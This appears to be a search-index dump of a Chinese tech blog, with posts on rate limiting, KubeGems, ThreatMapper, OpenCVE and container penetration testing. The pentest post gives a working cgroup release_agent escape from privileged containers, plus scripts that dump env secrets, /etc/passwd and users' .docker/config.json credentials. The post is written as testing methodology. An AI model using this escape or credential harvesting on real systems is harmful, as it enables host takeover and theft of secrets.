–急救，重症无法及时获得医疗资源。\n频繁处理同一个申请的，浪费资源。 –如果餐厅取号不用手机号，无良食客可以取 n 个2 人桌，3 人桌，5 人桌。\n浪费资源申请者的资源。 –排队抢购，排了半天，轮到我买的时候，告诉我，早就卖完了。\n\n\n\n现有的实现方案算法\n计数器[[固定时间窗口]]\n[[滑动时间窗口]]\n[[令牌桶]]\n[[漏桶算法]]\n\n服务降级解决的问题\n在服务器等硬件资源有限的情况下，或者整个微服务体系能承载的业务量有限的情况下，将某些承载边缘业务的系统资源的部分或者全部，调度给承载核心业务的系统来使用，牺牲边缘业务业务的用户体验，来保障核心业务的可用性。\n业务抉择以及技术、架构类解决方案，需要协调运营，客服等一起参与。\n从全局视角，统筹解决问题，主动选择。\n\n关系与区别\n服务降级是业务和技术共同指定的的策略，这个策略的实施依赖于熔断、超时、限流等技术手段实现的业务链路保护机制。\n超时是针对发起调用方（Consumer）自身的业务和系统规划指定的对某一微服务的最大容忍度，超时策略由发起调用方制定。不同的调用方，可以针对同一个被调用方设置不同的超时策略。\n熔断是发起调用方（Consumer）是在不信任被调用方的稳定性，当被调用方服务不稳定时，避免给被调方雪上加霜，给被调用方恢复的机会。熔断策略由发起调用方制定。不同的调用方，可以针对同一个被调用方设置不同的熔断策略。\n限流是服务提供方（即被调用方，Provider），基于自身业务系统的特性，能对外提供的稳定或最大能力。限流策略由服务提供方制定。服务提供方针对不同的调用方，可以设置统一的或者差异化的限流策略。  \n\n参考\n服务降级与服务熔断区别 - 知乎\n\n","slug":"熔断、超时、限流和服务降级","date":"2022-05-05T07:42:08.000Z","categories_index":"分布式,微服务","tags_index":"服务限流,服务熔断,服务降级","author_index":"Moses"},{"id":"5d82079790f13b8d3ae4a637793178a7","title":"Kubernetes学习笔记 --kubegem","content":"概述KubeGems是一款以围绕 Kubernetes 通过自研和集成云原生项目而构建的通用性开源 PaaS 云管理平台。经过我们内部近一年的持续迭代，当前 KubeGems 的核心功能已经初步具备多云多租户场景下的统一管理。并通过插件化的方式，在用户界面中灵活控制包括 监控系统、日志系统、微服务治理 等众多插件的启用和关闭。\n作为一个面向云原生的通用型云平台，KubeGems从立项开始就把支持多集群、多租户场景下的资源隔离作为其主要实现设计目标。用户可以对接入平台的 Kubernetes 集群做 租户级 的自定义资源规划。除此之外，我们提供了比原生 Dashboard 功能更加丰富且人性化操作的 UI 界面，让用户&#x2F;企业根据自身场景规划平台元数据，而不用担心自己的业务和数据出现错乱。同时 KubeGems 也提供过了众多丰富的功能模块来为个人或企业用户带来更好的使用体验，例如 _访问控制、资源规划、网络隔离、租户网关、存储卷、可观察性、用户审计、证书管理、金丝雀发布、istio治理_等功能。\n功能预览\nquick startKubeGems Installer Operator是一个通过 Operator SDK 构建的Ansible Kubernetes控制器。通过CRD中的定义的字段对Ansible进行变量传递。Installer Operator的运行需要具备集群管理员的RBAC权限，所以在部署前需要联系您的集群管理员，以保证有足够的授权执行以下操作。\ninstallerwget -O - https:&#x2F;&#x2F;github.com&#x2F;kubegems&#x2F;installer-operator&#x2F;releases&#x2F;download&#x2F;$&#123;KUBEGEMS_VERSION&#125;&#x2F;centrol.installer.yaml \\\n| sed &quot;s#repository: docker.io#repository: registry.cn-beijing.aliyuncs.com#g&quot; \\\n| kubectl apply -f -\n访问页面创建一个ingress规则将 kubegems dashboard 服务暴露出来，参考如下\napiVersion: extensions&#x2F;v1beta1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.org&#x2F;proxy-buffering: &quot;false&quot;\n    nginx.org&#x2F;websocket-services: gems-dashboard\n  name: gems-dashboard\n  namespace: gemcloud-system\nspec:\n  rules:\n  - host: console.kubegems.io\n    http:\n      paths:\n      - backend:\n          serviceName: gems-dashboard\n          servicePort: 8000\n        path: &#x2F;\n        pathType: ImplementationSpecific\n将域名console.kubegems.io解析到 Kubernetes 集群内任意节点后，即可通过 http://console.kubegems.io:&lt;NodePort&gt; 访问页面。推荐使用switchhost设置域名解析。\n系统命名空间\n\n\n命名空间\n用途\n\n\n\ncert-manager\n证书管理所在空间\n\n\nkubegems-installer\nKubeGems installer 所在空间\n\n\ngemcloud-system\nKubeGems系统服务所在空间\n\n\ngemcloud-monitoring-system\n监控告警服务所在空间\n\n\ngemcloud-logging-system\n日志服务所在空间\n\n\ngemcloud-gateway-system\n租户网关所在空间\n\n\ngemcloud-workflow-system\nci&#x2F;cd引擎所在空间\n\n\nobservability\n可观察组件所在空间\n\n\nistio-system\nistio 组件所在空间\n\n\nlocal-path-storage\nhost pv服务所在空间\n\n\nDevelopmentRun localkubegems have 5 components:\n\nservice: provide kubegems api server.\nmsgbus: provide instant communication for service, agent and dashboard.\nworker: execute long time task.\nagent: proxy all request by service in a single cluster.\ncontroller: reconcile all kubegems CRD requests.\n\nChoose one of these component you want to run, then:\n\nprepare certs: cd scripts &amp;&amp; bash generate-tls-certs.sh\nmake build\n./bin/kubegems &#123;component&#125; gencfg &gt; config/config.yaml\nModify config/config.yaml yourself, for different component, config.yaml is different, you can also use args or enironment variables.\n./bin/kubegems &#123;conpoment&#125;\n\n更多配置Linux内核优化inux kernel参数优化是为KubeGems worker节点更好、稳定的服务容器而总结出来的一套内核优化基线。其中部分参数涉及到机器性能的动态调整，文档里会给出计算公式，请读者自行根据情况转换。\n# 计算内存总量mem_total_bytes &#x3D; memtotal_mb * 1024 * 1024\n\n修改sysctl.conf使用vim打开并编辑/etc/sysctl.conf文件\nkernel.panic &#x3D; 10kernel.panic_on_oops &#x3D; 10kernel.sysrq&#x3D;0\n# 最大进程数#用命令ps -eLf | wc -l 查看当前实际 PID 数量，检查当前用户的 PID 数量\nkernel.pid_max&#x3D;196605\n#最大线程数\nkernel.threads_max&#x3D;196605\nkernel.ctrl-alt-del&#x3D;1\n#打开coredns\nkernel.core_pattern&#x3D;&#x2F;var&#x2F;log&#x2F;core.%e.%p.%t\nkernel.shmmax &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;2 &#125;&#125;\nkernel.shmall &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;2&#x2F;&#x2F;4096 &#125;&#125;\nkernel.msgmnb &#x3D; 65536\nkernel.msgmax &#x3D; 65536\nfs.file-max &#x3D; 1048576\n#每个 linux 进程可以持有多个 fd，每个 inotify 类型的 fd 可以 watch 多个目录，每个用户下所有进程 inotify 类型的 fd 可以 watch 的总目录数有个最大限制\nfs.inotify.max_user_instances&#x3D;524288\nfs.inotify.max_user_watches&#x3D;524288\n#如果wattch数过多可以打开 inotify_add_watch 跟踪，进一步 debug inotify watch 耗尽的原因:\n#echo 1 &gt;&gt; &#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;events&#x2F;syscalls&#x2F;sys_exit_inotify_add_watch&#x2F;enable\n#关闭swap空间\nvm.swappiness &#x3D; 0\nvm.max_map_count&#x3D;1048575\nvm.dirty_ratio &#x3D; 60\nvm.dirty_background_ratio &#x3D; 5\nvm.min_free_kbytes &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;1024&#x2F;&#x2F;100*5 &#125;&#125;\nnet.ipv4.tcp_syncookies &#x3D; 1\nnet.ipv4.tcp_synack_retries &#x3D; 2\nnet.ipv4.tcp_dsack &#x3D; 1\nnet.ipv4.tcp_sack &#x3D; 0\nnet.ipv4.tcp_fack &#x3D; 1\nnet.ipv4.conf.all.forwarding &#x3D; 1\nnet.ipv4.conf.default.forwarding &#x3D; 1\nnet.ipv4.ip_forward &#x3D; 1\nnet.ipv4.conf.all.send_redirects &#x3D; 0\nnet.ipv4.conf.default.send_redirects &#x3D; 0\nnet.ipv4.conf.all.accept_source_route &#x3D; 0\nnet.ipv4.conf.default.accept_source_route &#x3D; 0\nnet.ipv4.conf.all.rp_filter &#x3D; 0\nnet.ipv4.conf.default.rp_filter &#x3D; 0\nnet.ipv4.conf.all.accept_redirects &#x3D; 0\nnet.ipv4.conf.default.accept_redirects &#x3D; 0\nnet.ipv4.conf.all.secure_redirects &#x3D; 0\nnet.ipv4.conf.default.secure_redirects &#x3D; 0\nnet.ipv4.conf.all.bootp_relay &#x3D; 0net.ipv4.conf.all.proxy_arp &#x3D; 0\nnet.ipv4.icmp_echo_ignore_broadcasts &#x3D; 1\nnet.ipv4.icmp_ignore_bogus_error_responses &#x3D; 1\nnet.ipv4.tcp_rfc1337 &#x3D; 1\nnet.ipv4.tcp_congestion_control &#x3D; cubic\nnet.core.default_qdisc &#x3D; pfifo_fast\nnet.ipv4.tcp_ecn &#x3D; 2\nnet.ipv4.tcp_reordering &#x3D; 3\nnet.ipv4.tcp_retries2 &#x3D; 8\nnet.ipv4.tcp_retries1 &#x3D; 3\nnet.ipv4.tcp_no_metrics_save &#x3D; 1\nnet.ipv4.tcp_slow_start_after_idle &#x3D; 0\nnet.ipv4.tcp_fin_timeout &#x3D; 10\n#tcp_keepalive_time需要低于ipvs中的tcp_timeout时长，一般情况下要低于kube-proxy lvs的900s\nnet.ipv4.tcp_keepalive_time &#x3D; 600\nnet.ipv4.tcp_keepalive_probes &#x3D; 5\nnet.ipv4.tcp_keepalive_intvl &#x3D; 15\nnet.ipv4.ip_local_port_range &#x3D; 20000 65535\n#预留给kubernetes service的nodeport端口范围，不设置可能会造成#kubernetes在做服务探针时使用下列范围端口，造成连接被占用而失败，引起探针失效\nnet.ipv4.ip_local_reserved_ports &#x3D; 30000-32768\n# 每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目\nnet.core.netdev_max_backlog &#x3D; 16384\n#没有启用syncookies的情况下，syn queue(半连接队列)大小除了受somaxconn限制外，也受这个参数的限制，默认1024，优化到65535，避免在高并发场景下丢包\nnet.ipv4.tcp_max_syn_backlog &#x3D; 65535\n# 表示socket监听(listen)的backlog上限，也就是就是socket的监听队列(accept queue)，当一个tcp连接尚未被处理或建立时(半连接状态)\n#会保存在这个监听队列，默认为 128，在高并发场景下偏小，优化到 16384。参考 https:&#x2F;&#x2F;imroc.io&#x2F;posts&#x2F;kubernetes-overflow-and-drop&#x2F;\nnet.core.somaxconn &#x3D; 16384\nnet.ipv4.tcp_window_scaling &#x3D; 1\nnet.ipv4.tcp_adv_win_scale &#x3D; 2\nnet.ipv4.tcp_rmem &#x3D; 4096 524287 16777216\nnet.core.rmem_default &#x3D; 524287\nnet.core.rmem_max &#x3D; 16777216\nnet.ipv4.tcp_wmem &#x3D; 4096 524287 16777216\nnet.core.wmem_default &#x3D; 524287\nnet.core.wmem_max &#x3D; 16777216\nnet.core.optmem_max &#x3D; 524287\nnet.ipv4.tcp_fastopen &#x3D; 3\nnet.ipv4.tcp_timestamps &#x3D; 1\nnet.ipv4.tcp_tw_recycle &#x3D; 0\nnet.ipv4.tcp_tw_reuse &#x3D; 0\nnet.ipv4.tcp_max_tw_buckets &#x3D; 360000\n# 当前 arp 记录数接近 gc_thresh3 比较容易 overflow，因为当 arp 记录达到 gc_thresh3 时会强制触发 gc 清理#当这时又有数据包要发送，并且根据目的 IP 在 arp cache 中没找到 mac 地址，这时会判断当前 arp cache 记录数加 1 是否大于 gc_thresh3#如果没有大于就会 时就会报错: arp_cache: neighbor table overflow!# arp -an | wc -l参看arp记录数\nnet.ipv4.neigh.default.gc_thresh3 &#x3D; 2048\nnet.ipv4.neigh.default.gc_thresh2 &#x3D; 1024\nnet.ipv4.neigh.default.gc_thresh1 &#x3D; 128\n#分析如果是业务服务常见性的出现&quot;arp_cache: neighbor table overflow!&quot;，则考虑推送将下列注释的参数推倒所有Node节点\n#net.ipv4.neigh.default.gc_thresh1 &#x3D; 80000\n#net.ipv4.neigh.default.gc_thresh2 &#x3D; 90000\n#net.ipv4.neigh.default.gc_thresh3 &#x3D; 100000\nnet.ipv4.neigh.default.gc_interval &#x3D; 120\nnet.ipv4.route.flush &#x3D; 1\nnet.ipv4.rt_cache_rebuild_count &#x3D; -1\nnet.netfilter.nf_conntrack_max &#x3D; 4194304net.nf_conntrack_max &#x3D; 4194304\nnet.netfilter.nf_conntrack_buckets &#x3D; 1048576\nnet.netfilter.nf_conntrack_tcp_timeout_fin_wait&#x3D;30\nnet.netfilter.nf_conntrack_tcp_timeout_time_wait&#x3D;300\nnet.netfilter.nf_conntrack_tcp_timeout_close_wait&#x3D;1\n#维持通过NAT维持TCP长连接的优化,注意kube-proxy会修改此参数\nnet.netfilter.nf_conntrack_tcp_timeout_established&#x3D;3600\n#tcp_keepalive_time+ tcp_keepalive_interval * tcp_keepalive_max_retry + 2msl取整\n#https:&#x2F;&#x2F;www.xinmeow.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;iptables-nf_conntrack-%E6%9D%A1%E7%9B%AE%E7%9A%84%E8%80%81%E5%8C%96%E6%97%B6%E9%97%B4%E5%9B%A0%E8%AF%A5%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%94%9F%E4%B8%A2%E5%8C%85%E8%80%8C%E5%8F%98%E7%9F%AD%EF%BC%8C&#x2F;\nnet.netfilter.nf_conntrack_tcp_timeout_max_retrans&#x3D;720\nnet.ipv6.conf.all.disable_ipv6 &#x3D; 1\nnet.ipv6.conf.default.disable_ipv6 &#x3D; 1\n\n生效配置执行sysctl -p命令即时生效配置或者执行reboot重启服务器后内核配置生效\ndebug by vscode&#123;\n  &quot;name&quot;: &quot;service&quot;,\n  &quot;type&quot;: &quot;go&quot;,\n  &quot;request&quot;: &quot;launch&quot;,\n  &quot;mode&quot;: &quot;debug&quot;,\n  &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;&#x2F;cmd&quot;,\n  &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, \n  &quot;args&quot;: [&quot;service&quot;] &#x2F;&#x2F; may also be msgbus, worker, agent, controller\n&#125;","slug":"kubegem","date":"2022-05-04T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,Docker,kubegem","author_index":"Moses"},{"id":"f8440a3d154328a49baadf9056bbbcfd","title":"容器安全平台-deepfence-ThreatMapper","content":"容器安全平台-deepfence0x01简介ThreatMapper 开源云原生安全可观测性平台\n0x02架构图Deepfence Threat由两部分组成：\n\nManagement Console:管理端包括应用拓扑、一般SBOMs漏洞、威胁地图\nThreatMapper Sensor:采集器\n\n0x03核心能力略\n0x04对比略\n0x05QuickstartrequireManagement Console requie 4C 16G install docker &amp; docker-compose port 443ThreatMapper with helm require sc [[OpenEBS.md]]\n# Install OpenEBS, and wait for it to start up\nkubectl create ns openebs\nhelm install openebs --namespace openebs --repo &quot;https:&#x2F;&#x2F;openebs.github.io&#x2F;charts&quot; openebs --set analytics.enabled&#x3D;false\nkubectl get pods -o wide --namespace openebs -w\n\n# Install the Kubernetes metrics service (if not already installed)\nkubectl apply -f https:&#x2F;&#x2F;github.com&#x2F;kubernetes-sigs&#x2F;metrics-server&#x2F;releases&#x2F;download&#x2F;v0.6.1&#x2F;components.yaml\n\n# Configure the Deepfence ThreatMapper Helm Chart\nhelm repo add deepfence https:&#x2F;&#x2F;deepfence-helm-charts.s3.amazonaws.com&#x2F;threatmapper\n\n# Install the ThreatMapper console and wait for the pods to start up\nhelm install deepfence-console deepfence&#x2F;deepfence-console\nkubectl get pods -o wide -w\n\n# Optionally, install the Deepfence Router service and wait for the platform to deploy a load balancer\nhelm install deepfence-router deepfence&#x2F;deepfence-router\nkubectl get --namespace default svc -w deepfence-router\n\nManagement Console installsudo sysctl -w vm.max_map_count&#x3D;262144 # see https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;elasticsearch&#x2F;reference&#x2F;current&#x2F;vm-max-map-count.html\n\nwget https:&#x2F;&#x2F;github.com&#x2F;deepfence&#x2F;ThreatMapper&#x2F;raw&#x2F;master&#x2F;deployment-scripts&#x2F;docker-compose.yml\ndocker-compose -f docker-compose.yml up --detach\nThreatMapper Sensor installinstall with dockerdocker run -dit --cpus&#x3D;&quot;.2&quot; --name&#x3D;deepfence-agent --restart on-failure --pid&#x3D;host --net&#x3D;host \\\n  --privileged&#x3D;true -v &#x2F;sys&#x2F;kernel&#x2F;debug:&#x2F;sys&#x2F;kernel&#x2F;debug:rw -v &#x2F;var&#x2F;log&#x2F;fenced \\\n  -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v &#x2F;:&#x2F;fenced&#x2F;mnt&#x2F;host&#x2F;:ro \\\n  -e USER_DEFINED_TAGS&#x3D;&quot;&quot; -e MGMT_CONSOLE_URL&#x3D;&quot;---CONSOLE-IP---&quot; -e MGMT_CONSOLE_PORT&#x3D;&quot;443&quot; \\\n  -e DEEPFENCE_KEY&#x3D;&quot;---DEEPFENCE-API-KEY---&quot; \\\n  deepfenceio&#x2F;deepfence_agent_ce:latest\ninstall with helmhelm repo add deepfence https:&#x2F;&#x2F;deepfence-helm-charts.s3.amazonaws.com&#x2F;threatmapper\n\nhelm install deepfence-agent deepfence&#x2F;deepfence-agent \\\n    --set managementConsoleUrl&#x3D;---CONSOLE-IP--- \\\n    --set deepfenceKey&#x3D;---DEEPFENCE-API-KEY---\n\n\ncheck\n\n进阶-intergrationsSIEM\nNotification\n镜像扫描\nticketing\nreport\n","slug":"容器安全平台-deepfence-ThreatMapper","date":"2022-04-21T03:36:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"容器安全平台,产品选型,开源云原生安全,DeepFence,云原生威胁地图","author_index":"Moses"},{"id":"187ba77175374873452e35cc1b1a9ffe","title":"容器安全-针对容器的渗透测试方法","content":"攻击者模型攻击者模型容器逃逸和针对Docker守护进程的攻击，分别对应位于容器内部的攻击者和位于运行了Docker守护进程的宿主机上的攻击者。\n其中，容器逃逸包括容器内进程影响到宿主机或其他容器两种情况，示意图如下：\n针对Docker守护进程的攻击则指宿主机上低权限攻击者借助Docker守护进程获取到敏感数据或更高权限，示意图如下：\n![[A_Methodology_for_Penetration_Testing_Docker_Systems.pdf]]Sari Sultan等人对整个容器环境的潜在攻击面和攻击对象进行梳理，抽象出四类威胁：\n安全问题\n测试方法\n环境变量读取环境变量本身是一种常用的宿主机与容器的通信方式。然而，作为容器内的攻击者，他同样获得环境变量中可能存在的敏感信息，从而扩大战果，如借助环境变量设置数据库访问凭证的场景：\n(host)$ docker run --rm -e MYSQL_ROOT_PASSWORD&#x3D;supersecret -- name&#x3D;database mariadb:latest\n(host)$ docker exec -it database bash (cont)# env  \n...\nMYSQL_ROOT_PASSWORD&#x3D;supersecret\n特权模式检查对于容器内的攻击者来说，特权模式几乎就意味着容器逃逸。如下所示，特权模式意味着容器内进程将具备等同于宿主机上进程的所有权限：\n(host)$ docker run -it --rm --privileged ubuntu:latest grep CapEff &#x2F;proc&#x2F;1&#x2F;status\n\nCapEff: 0000003fffffffff  \n(host)$ capsh --decode&#x3D;0000003fffffffff 0x0000003fffffffff&#x3D;cap_chown,cap_dac_override,\n\ncap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,\ncap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,\ncap_net_bind_service,cap_net_broadcast,cap_net_admin,\ncap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,\ncap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct, \n\ncap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,\ncap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,\ncap_audit_write,cap_audit_control,cap_setfcap,\ncap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,\ncap_block_suspend,cap_audit_read\n\n借助特权模式进行容器逃逸的方法1.启动一个特权容器\ndocker run --rm -it --privileged ubuntu bash\n2.在容器内执行命令读取宿主机进程列表\n# In the container\nmkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o memory cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x\n \necho 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release\nhost_path&#x3D;&#96;sed -n &#39;s&#x2F;.*\\perdir&#x3D;\\([^,]*\\).*&#x2F;\\1&#x2F;p&#39; &#x2F;etc&#x2F;mtab&#96;\necho &quot;$host_path&#x2F;cmd&quot; &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent\n \necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;cmd\necho &quot;ps aux &gt; $host_path&#x2F;output&quot; &gt;&gt; &#x2F;cmd\nchmod a+x &#x2F;cmd\n \nsh -c &quot;echo \\$\\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs&quot;\n3.方法原理该攻击手法实际上利用了Linux cgroup v1的notify_on_release特性，在普通容器中，由于不具有SYS_ADMIN权限，以及AppArmor的限制，这种攻击无法成功。因此，特权模式是危险的。\n渗透测试速查表探测是否是容器环境问题：/.dockerenv文件是否存在？\n操作：执行ls /.dockerenv查看。\n问题：/proc/1/cgroup中是否包括/docker字样？\n操作：执行grep &#39;/docker&#39; /proc/1/cgroup查看。\n问题：当前环境内的进程数是否少于5个？\n操作：执行ps aux查看。\n问题：PID为1的进程是否是常规init进程（如systemd或init）？\n操作：执行ps -p1查看PID为1的进程。\n问题：当前环境是否缺少常见库或工具？\n操作：执行which xxx来查看常用工具是否存在，例如执行which sudo来查看sudo是否存在。\n自动化脚本#!&#x2F;bin&#x2F;bash\n\nDOCKER_ENV_FILE&#x3D;&#x2F;.dockerenv\nDOCKER&#x3D;docker\nDOCKER_CGROUP&#x3D;&#x2F;proc&#x2F;1&#x2F;cgroup\n\nls -al $DOCKER_ENV_FILE\ngrep &quot;$DOCKER&quot; $DOCKER_CGROUP\nps aux\nps -p1\nwhich sudo\nwhich apt\nwhich vi\nwhich ping\nwhich ssh\n\n从容器内发起测试问题：当前用户是？\n操作：执行id查看当前用户和用户组。\n问题：当前环境中存在哪些用户？\n操作：读取/etc/passwd数据，例如cat /etc/passwd。\n问题：容器操作系统是？\n操作：读取/etc/os-release数据，获得操作系统相关信息。\n问题：有哪些进程在容器内运行？\n操作：执行ps aux查看。\n问题：宿主机内核版本是？\n操作：执行uname -a查看。\n问题：容器内进程具有哪些权限（capabilities）？\n操作：执行grep CapEff /proc/self/status获得权限值，在其他系统上执行capsh --decode=value将前面获得的值解析为具体权限。例如：问题：当前容器是否运行在特权模式？\n操作：如果上一步中得到的权限值为0000003fffffffff，那么容器就运行在特权模式，我们就能够进行容器逃逸。\n问题：容器挂载了哪些卷？\n操作：读取/proc/mounts数据，查看卷挂载情况。\n问题：环境变量中是否存储了敏感信息？\n操作：执行env命令，列举所有环境变量。\n问题：容器内是否挂载了Docker Socket？\n操作：检查/proc/mounts是否包含docker.sock或类似文件。通常/run/docker.sock或/var/run/docker.sock会是挂载点。如果发现挂载，我们就能够进行容器逃逸。\n问题：哪些主机是当前环境下网络可达的？\n操作：有条件的话应该使用nmap探测。还可以先读取/etc/hosts查看容器的IP地址。\n自动化脚本#!&#x2F;bin&#x2F;bash\n\nid\ncat &#x2F;etc&#x2F;passwd\ncat &#x2F;etc&#x2F;os-release\nps aux\nuname -a\ngrep CapEff &#x2F;proc&#x2F;self&#x2F;status\nCAP&#x3D;&#96;grep CapEff &#x2F;proc&#x2F;self&#x2F;status | cut  -f 2&#96;\nif [ &quot;$CAP&quot; &#x3D; &quot;0000003fffffffff&quot; ]; then\n\techo -e &quot;Container is privileged.&quot;\nelse\n\techo -e &quot;Container is not privileged.&quot;\nfi\ncat &#x2F;proc&#x2F;mounts\nenv\ncat &#x2F;proc&#x2F;mounts | grep docker.sock\ncat &#x2F;etc&#x2F;hosts\n\n从运行Docker守护进程的宿主机上发起测试问题：Docker版本是多少？\n操作：执行docker --version查看。我们可以据此判断一些已知漏洞是否存在。\n问题：哪些CIS条目没有被正确地配置？使用docker-bench-security检查配置问题：哪些用户被允许与Docker Socket交互？\n操作：执行ls -l /var/run/docker.sock来查看/var/run/docker.sock所属用户和用户组，以及哪些用户对其有读写权限。\n问题：哪些用户在docker用户组中？\n操作：执行grep docker /etc/group查看。\n问题：Docker客户端工具是否设置了setuid标志位？\n操作：执行ls -l $(which docker)查看。\n问题：当前宿主机上有哪些可用镜像？\n操作：执行docker images -a查看。\n问题：当前宿主机上有哪些容器？\n操作：执行docker ps -a查看。\n问题：Docker守护进程是如何启动的（带了哪些参数）？\n操作：读取配置文件，例如/usr/lib/systemd/system/docker.service和/etc/docker/daemon.json来查看。\n问题：当前宿主机上是否存在一些docker-compose.yaml文件？\n操作：执行find / -name &quot;docker-compose.*&quot;查看。\n问题：当前宿主机上是否存在.docker/config.json文件？\n操作：执行cat /home/*/.docker/config.json来读取任何可能存在的.docker/config.json文件。\n问题：iptables规则集是否同时为宿主机和容器设置？\n操作：执行iptables -vnL或iptables -t filter -vnL查看。\n自动化脚本#!&#x2F;bin&#x2F;bash\n\nls -l &#x2F;var&#x2F;run&#x2F;docker.sock\ngrep docker &#x2F;etc&#x2F;group\nls -l $(which docker)\ndocker images -a\ndocker ps -a\ncat &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service\ncat &#x2F;etc&#x2F;docker&#x2F;daemon.json\nfind &#x2F; -name &quot;docker-compose.*&quot;\ncat &#x2F;home&#x2F;*&#x2F;.docker&#x2F;config.json\niptables -t filter -vnL\n\n","slug":"针对容器的渗透测试方法","date":"2022-04-11T03:36:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"容器安全,优秀文章收藏,渗透测试","author_index":"Moses"},{"id":"c1f27b84e7a962a64fb70a195391b7ba","title":"开源漏洞库工具-OpenCVE","content":"简介OpenCVE是一个平台，用于本地导入CVE列表并对其进行搜索（按供应商、产品、CVSS、CWE…）。\n\n项目地址OpenCVE\n文档OpenCVE Documentation\n\n原理\n数据源\nCPE: https://nvd.nist.gov/feeds/xml/cpe/dictionary/official-cpe-dictionary_v2.3.xml.gz\nCWE: https://cwe.mitre.org/data/xml/cwec_latest.xml.zip\nCVE:\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2021.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2020.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2019.json.gz\n[…]\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2002.json.gz\n\n\n\nAPI和数据源类型\n\n\n类型\n描述\n\n\n\nCVE和CPE API\n传统漏洞数据提要文件的替代品。与JSON漏洞提要和CPE匹配提要相比，API要灵活得多，在单个界面中提供了更丰富的数据集。\n\n\nJSON脆弱性信息\n文件中的每个漏洞都包括来自CVE®词典提要的描述和相关参考链接，以及CVSS基本分数、易受攻击的产品配置和弱点分类。\n\n\nCPE比赛Feed\n根据官方CPE词典中的CPE匹配提供产品&#x2F;平台适用性声明到CPE URI匹配的提要。\n\n\nRSS漏洞Feed\n八天的安全相关软件缺陷窗口。\n\n\n漏洞翻译Feed\n漏洞提要的翻译。\n\n\n漏洞供应商评论\n供应商就影响产品内部的特定缺陷提供的评论。\n\n\nCPE词典\n包含产品列表的词典。\n\n\n通用配置枚举（CCE）参考数据\n常见配置项的参考数据。\n\n\n安装手动安装Manual - OpenCVE Documentation\nDocker InstallationThe Docker installation is the method to choose if you want to quickly deploy OpenCVE without managing the dependencies (like PostgreSQL, Redis or Celery).\nRequirementsThe current documentation has been tested on Debian 10 and Ubuntu LTS 20.04 with the following requirements :\n\nDocker-compose 1.21.0+\nDocker 20.10.1+\n5 GB RAM\n\nConfigurationGet the OpenCVE docker repository:\n$ git clone https://github.com/opencve/opencve-docker.git \nPrepare and copy the configuration file from the conf directory:\n$ cd opencve-docker &amp;&amp; cp ./conf/opencve.cfg.example ./conf/opencve.cfg \nUpdate the following keys in the opencve.cfg file:\n\nserver_name (use the same port if you changed it in the .env file)\nsecret_key (see the Flask recommandations)\nsmtp_server\nsmtp_user &amp; smtp_password if any or leave empty\n\n💡Tip\nIf you want to change the default postgresql password (strongly advised), you can add it in the .env file before the docker-compose build:\nPOSTGRES_PASSWORD=MyStrongPassword42 \n构建镜像文件$ docker-compose build&#96; \n启动容器$ docker-compose up -d postgres redis webserver celery_worker\n初始化数据库$ docker exec -it webserver opencve upgrade-db\n导入数据导入数据命令\n$ docker exec -it webserver opencve import-data&#96; \n\n\n\n\n\n\n\n\n\nWarningThe NVD data are downloaded, extracted and then parsed in-memory before being inserted in the database. For that the import-data command needs 5GB at least to correctly do its job. Afterwards, the worker use very small memory as only the diff is used with the NVD.If you launch opencve import-data without this memory space the command will be killed (OOM) by your operating system and your data will be incompletes.We wrote a documentation to handle this problem using a SWAP file.\n导入数据速度比较慢，从2002-2022年，CWE文件比较大,第一次导入经常报错📢导入失败，终止原因可能是网络问题（之前分别终止在2007年数据、2010年数据），当然也不排除docker内存问题及存储空间问题📢导入失败后，初始化数据库报错\nopencve upgrade-db\nINFO  [alembic.runtime.migration] Context impl PostgresqlImpl.\nINFO  [alembic.runtime.migration] Will assume transactional DDL.\n对策1： 使用docker-compose命令停止并删除资源后，重新部署。\ndocker-compose\nOptions:  \n--rmi type 删除镜像,可选参数all(删除所有镜像),local(只删除没有tag的镜像)  \n-v, --volumes 删除命名volumes和挂载到容器中的匿名volumes  \n--remove-orphans 删除Compose文件中未定义的服务的容器  \n-t, --timeout TIMEOUT Specify a shutdown timeout in seconds. (default: 10)\n对策2： 手动导入数据库或者使用opencve脚本下载导入到PostgreSQL\n# 登录数据库\npsql postgresql:&#x2F;&#x2F;opencve:opencve@postgres:5432&#x2F;opencve\n# 查看所有数据库\nopencve-# \\l\n                               List of databases\n   Name    |  